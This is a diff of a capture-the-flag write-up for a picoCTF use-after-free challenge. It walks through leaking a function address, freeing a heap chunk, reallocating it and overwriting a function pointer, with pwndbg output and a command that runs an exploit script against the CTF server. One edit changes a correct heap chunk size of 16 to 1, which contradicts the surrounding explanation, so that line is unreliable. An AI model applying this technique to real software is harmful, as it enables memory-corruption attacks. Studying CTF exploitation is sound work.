@@ -6,6 +6,8 @@
 
 >Check out my new video-game and spaghetti-eating streaming channel on Twixer!
 
+## Source
+
 ```c
 #include <ctype.h>
 #include <fcntl.h>
@@ -177,7 +179,6 @@ main() then indefinitely loops:
 
 When we select a menu option, e.g. `S` the `user->whatToDo` function pointer is updated, to point at the relevant function, e.g. `s`:
 
-
 **(S)** Leak `hahaexploitgobrrr` address\
 **(I)** `free()` the `user` object\
 **(M)** Create account, sets `user->username`\
@@ -199,7 +200,7 @@ We can set some breakpoints in GDB:
 2. `break *0x8048aff` - After `free(user)` in `i()`
 3. `break *0x8048a61` - After `char* msg = (char*)malloc(8)` in `leaveMessage()`
 
-The first breakpoint shows the address of the `user` chunk (`0x95cd1a0`), returned to the `EAX` by malloc:
+The **first breakpoint** shows the address of the `user` chunk (`0x95cd1a0`), returned to the `EAX` by malloc.
 
 ```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
@@ -228,9 +229,9 @@ The first breakpoint shows the address of the `user` chunk (`0x95cd1a0`), return
    0x8048d92 <main+93>    call   doProcess                     <doProcess>
 ```
 
-The chunk size is 16
+The chunk size is 1.
 
-0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free:
+0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free.
 
 ```sh
 pwndbg> x/8gwx 0x95cd1a0 - 4
@@ -238,7 +239,7 @@ pwndbg> x/8gwx 0x95cd1a0 - 4
 0x95cd1ac:	0x00021e59	0x00000000	0x00000000	0x00000000
 ```
 
-We'll create a user "crypto" and check the chunk again:
+We'll create a user "crypto" and check the chunk again.
 
 ```sh
 pwndbg> x/8gwx 0x95cd1a0 - 4
@@ -246,14 +247,14 @@ pwndbg> x/8gwx 0x95cd1a0 - 4
 0x95cd1ac:	0x00001011	0x70797263	0x000a6f74	0x00000000
 ```
 
-The next 4 bytes after the chunk size (`0x080489f6`) hold the `user->whatToDo` function pointer:
+The next 4 bytes after the chunk size (`0x080489f6`) hold the `user->whatToDo` function pointer.
 
 ```sh
 pwndbg> x 0x080489f6
 0x80489f6 <m>:	0x53e58955
 ```
 
-The next 4 bytes after that hold the `user->username` char pointer:
+The next 4 bytes after that hold the `user->username` char pointer.
 
 ```sh
 pwndbg> x/gx 0x095ce1c0
@@ -266,7 +267,7 @@ pwndbg> unhex a6f7470797263
 otpyrc
 ```
 
-Second breakpoint, after the user chunk has been freed:
+**Second breakpoint**, after the user chunk has been freed.
 
 ```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
@@ -296,7 +297,7 @@ Second breakpoint, after the user chunk has been freed:
    0x8048b2e <printMenu+1>    mov    ebp, esp
 ```
 
-We can check the chunk address again:
+We can check the chunk data again.
 
 ```sh
 pwndbg> x/8gwx 0x95cd1a0 - 4
@@ -306,7 +307,7 @@ pwndbg> x/8gwx 0x95cd1a0 - 4
 
 Notice the `user->whatToDo` function pointer is now empty because the first word in a free chunk holds the previous free chunk's address (prev_ptr). However, the username remains.
 
-We can check the heap and see that our free chunk is in the `tcache`:
+We can check the heap and see that our free chunk is in the `tcache`.
 
 ```sh
 pwndbg> heap
@@ -332,7 +333,7 @@ Addr: 0x95ce228
 Size: 0x20dd9
 ```
 
-Third breakpoint, after a new 8 byte chunk is allocated by malloc:
+**Third breakpoint**, after a new 8 byte chunk is allocated by malloc.
 
 ```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
@@ -360,7 +361,7 @@ Third breakpoint, after a new 8 byte chunk is allocated by malloc:
    0x8048a7d <leaveMessage+92>    leave  
 ```
 
-`malloc(8)` has returned `0x95cd1a0`, the same address as our previous chunk. Hence we are using-after-free when we write our message. We submit the leaked `hahaexploitgobrrr` function address, overwriting `user->whatToDo`. The infinite loop in main executes `doProcess(user)`, triggering the `hahaexploitgobrrr` function and printing the flag:
+`malloc(8)` has returned `0x95cd1a0`, the same address as our previous chunk. Hence we are using-after-free when we write our message. We submit the leaked `hahaexploitgobrrr` function address, overwriting `user->whatToDo`. The infinite loop in main executes `doProcess(user)`, triggering the `hahaexploitgobrrr` function and printing the flag.
 
 ```sh
 python exploit.py REMOTE mercury.picoctf.net 61817
